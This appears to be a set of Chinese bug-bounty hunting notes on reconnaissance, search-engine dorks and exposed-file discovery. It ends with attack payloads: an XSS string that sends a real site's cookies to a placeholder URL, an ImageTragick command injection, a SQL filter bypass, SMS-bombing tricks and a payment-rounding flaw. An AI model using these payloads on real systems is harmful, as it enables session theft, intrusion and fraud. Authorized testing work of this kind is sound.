# SRC挖掘

## 实战
[[西北大学rce]]
[[脸爱云弱口令]]
[[圆通src]]

## Tricks

js 查找关键词 

```
url:, POST, api, GET, setRequestHeader, send(
```

* upload

**Null bytes, %00**, **New lines, %0d%0a** and **tabs, %09 %07** in order to bypass filters

## 信息收集

burp sitemap scope `(^|^[^:]+:\/\/|[^\.]+\.)spdbccc.*`



子域名查询-https://chaziyu.com、https://site.ip138.com/xxx.com/domain.htm
### fofa语法

### google语法

```
site:<domain>
title
filetype
ext
@<social media> eg:@twitter
$400 搜索价格
# 搜索标签
- 排除 eg：-car
"" 必须包含
..  范围 eg:$50..$100
OR  或者
AND
related:	搜索相关网站
* 通配符
intitle
inurl
intext
```

测试范围：*.\<doamin\>.com

### 根域名

+ 小蓝本: https://www.xiaolanben.com/pc
+ 企查查: https://www.qichacha.com
+ 天眼查: https://www.tianyancha.com
+ 爱企查: https://aiqicha.baidu.com

### 子域名
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240322001750.png)


+ 查子域: https://chaziyu.com/ (在线)

*  子域名爆破

  ```shell
  python D:\pentest\Info\子域名爆破\subDomainsBrute\subDomainsBrute.py -o output www.baidu.com
  ```

* subdomainbrute
* [subdomain](https://rapiddns.io/s/nwu.edu.cn#result)

### 旁站

+ 在线: http://stool.chinaz.com/same
+ 在线: https://site.ip138.com

### 灯塔
自动收集资产工具
### Googlehack语法

1. 后台地址

+ site:xxx.com intitle:管理|后台|登陆|管理员|系统|内部
+ site:xxx.com inurl:login|admin|system|guanli|denglu|manage|admin_login|auth|dev

2. 敏感文件

+ site:xxx.com (filetype:doc OR filetype:ppt OR filetype:pps OR filetype:xls OR filetype:docx OR filetype:pptx OR filetype:ppsx OR filetype:xlsx OR filetype:odt OR filetype:ods OR filetype:odg OR filetype:odp OR filetype:pdf OR filetype:wpd OR filetype:svg OR filetype:svgz OR filetype:indd OR filetype:rdp OR filetype:sql OR filetype:xml OR filetype:db OR filetype:mdb OR filetype:sqlite OR filetype:log OR filetype:conf)

3. 测试环境

+ site:xxx.com inurl:test|ceshi
+ site:xxx.com intitle:测试

4. 邮箱

+ site:xxx.com (intitle:"Outlook Web App" OR intitle:"邮件" OR inurl:"email" OR inurl:"webmail")

5. 其他

+ site:xxx.com inurl:api|uid=|id=|userid=|token|session
+ site:xxx.com intitle:index.of "server at"

### 历史漏洞

+ 乌云镜像: https://wooyun.x10sec.org
+ Seebug: https://www.seebug.org
+ Exploit Database: https://www.exploit-db.com
+ Vulners: https://vulners.com
+ Sploitus: https://sploitus.com


### Asset and content discovery

| **Sign-up URI**               | **CMS platform** |
| ----------------------------- | ---------------- |
| /register                     | Laravel          |
| /user/register                | Drupal           |
| /wp-login.php?action=register | WordPress        |
| /register                     | eZ Publish       |

> 如果您正在 Drupal 网站上搜索，请在“/node/”上使用 Burp Suite Intruder（或任何其他类似工具）进行模糊测试，其中“”是一个数字（从 1 到 500）。例如：
>
> - https://target.com/node/1
> - https://target.com/node/2
> - https://target.com/node/3
> - …
> - https://target.com/node/499
> - https://target.com/node/500
>
> 我们很可能会找到搜索引擎未引用的隐藏页面（测试、开发）。

> [在Shodan](https://www.shodan.io/)中搜索以下图标哈希以查找部署在目标组织中的 Spring Boot 服务器：
>
> ```
> org:YOUR_TARGET http.favicon.hash:116323821
> ```
>
> 然后检查暴露的执行器。如果 /env 可用，您可能可以实现 RCE。如果 /heapdump 可访问，您可能会找到私钥和令牌

> 打开 RocketMQ 控制台，它通常会泄露相当机密的生产信息：
>
> ```
> org:target.com http.title:rocketmq-console
> ```
>
> 例如，从暴露的 RocketMQ 控制台中，我们可以了解到：
>
> - 其他主机名和子域
> - 内部 IP 地址
> - 日志文件位置
> - 版本详情
> - ETC。

> Here’s a quick tip to find git and svn files using this small but quick fuzz list:
>
> ```
> /.git
> /.git-rewrite
> /.git/HEAD
> /.git/config
> /.git/index
> /.git/logs/
> /.git_release
> /.gitattributes
> /.gitconfig
> /.gitignore
> /.gitk
> /.gitkeep
> /.gitmodules
> /.gitreview
> /.svn
> /.svn/entries
> /.svnignore
> ```

### Data extraction

* extract urls from js

```
curl http://host.xx/file.js | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*"*
```

* extract apis from js

```
cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u
```

### Sensitive information leak

- Top 5 Google dorks

 ```
  inurl:example.com intitle:"index of"
  inurl:example.com intitle:"index of /" "*key.pem"
  inurl:example.com ext:log
  inurl:example.com intitle:"index of" ext:sql|xls|xml|json|csv
  inurl:example.com "MYSQL_ROOT_PASSWORD:" ext:env OR ext:yml -git
  ```

> Here’s a tip to achieve sensitive data leak using .json extension.
>
> - Request:
>   `GET /ResetPassword HTTP/1.1{"email":"victim@example.com"}`
>
>   Response:
>   `HTTP/1.1 200 OK`
>
> Now let’s try this instead:
>
> - Request:
>   `GET /ResetPassword.json HTTP/1.1{"email":"victim@example.com"}`
>
>   Response:
>   `HTTP/1.1 200 OK{"success":"true","token":"596a96-cc7bf-9108c-d896f-33c44a-edc8a"}`
>
> Notice the added .json extension in our request which resulted in obtaining the secret token!

```

# Login panel search
site:target.com inurl:admin | administrator | adm | login | l0gin | wp-login

# Login panel search #2
intitle:"login" "admin" site:target.com

# Admin panel search
inurl:admin site:target.com

# Search for our target's exposed files
site:target.com ext:txt | ext:doc | ext:docx | ext:odt | ext:pdf | ext:rtf | ext:sxw | ext:psw | ext:ppt | ext:pptx | ext:pps | ext:csv | ext:mdb

# Get open directories (index of)
intitle:"index of /" Parent Directory site:target.com

# Search for exposed admin directories
intitle:"index of /admin" site:target.com

# Search for exposed password directories
intitle:"index of /password" site:target.com

# Search for directories with mail
intitle:"index of /mail" site:target.com

# Search for directories containing passwords
intitle:"index of /" (passwd | password.txt) site:target.com

# Search for directories containing .htaccess
intitle:"index of /" .htaccess site:target.com

# Search for .txt files with passwords
inurl:passwd filetype:txt site:target.com

# Search for potentially sensitive database files
inurl:admin filetype:db site:target.com

# Search for log files
filetype:log site:target.com

# Search for other sites that are linking to our target
link:target.com -site:target.com
```


## XSS

```
https://www.32red.com/ HTTP/1.1
Cookie: csrfToken=INJECTION'-fetch('https:/%2F-->REPLACE_URL_HERE<--',{method:'POST',body:document.cookie+"\u003bCAKEPHP="+Red.SessionId})-'
bin
```

*NOTE: Remember to replace `https://` with `https:%2F%252F` as you can see above*

*trick* 
 > 绕过思路就是
> 在action前面加一个/
> action/=javascript:

>上传图片处修改url为 `javascript:window['al'+'ert']('xss')`

## SQL

*   CVE搜索处存在

```
/**/AND/**/'1%'='1
```

## RCE

*   ImageTragick 攻击

    ```
    push graphic-context
    viewbox 0 0 640 480
    fill 'url(https://example.com/image.jpg "|whoami>>/tmp/alyssa.txt")'
    pop graphic-context
    ```

    

## 逻辑漏洞
### 短信轰炸
> 17699999999
> url 编码为%31%37699999999 
> 手机号码前后加空格，86，086，0086，+86，0，00，/r,/n, 以及特殊符号等
> 修改cookie，变量，返回
> 138888888889   12位经过短信网关取前11位，导致短信轰炸
>
> 进行能解析的编码。

### 支付漏洞
- 四舍五入
>充值0.019四舍五入为0.2